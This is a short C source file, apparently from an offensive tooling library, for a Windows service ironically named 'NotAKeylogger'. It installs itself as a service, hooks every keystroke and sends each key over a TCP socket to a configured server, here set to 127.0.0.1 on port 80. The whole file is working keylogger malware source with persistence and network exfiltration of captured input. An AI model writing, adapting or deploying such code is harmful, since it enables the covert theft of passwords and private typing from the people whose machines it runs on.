// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#include "../wsbind.h"

#define NAME "NotAKeylogger\0"
#define SERVER "127.0.0.1\0"

SockData keySocket;

void service_key_hit(unsigned char keyd)
{
    unsigned char kdata[2];
    kdata[0] = keyd;
    wsc_write(&keySocket, kdata);
}

void service_main(int** running)
{
    wsc_init();
    keySocket = wsc_tcp_create(SERVER, 80);
    wsk_register_listener(service_key_hit);
    wsk_start_scan(0, 0);
}

int main(int argc, char **argv)
{
    if(argc == 2)
    {
        wsw_this_as_service(NAME, NULL, TRUE, NULL);
        return 0;
    }
    return wsw_service(NAME, 0, *service_main);
}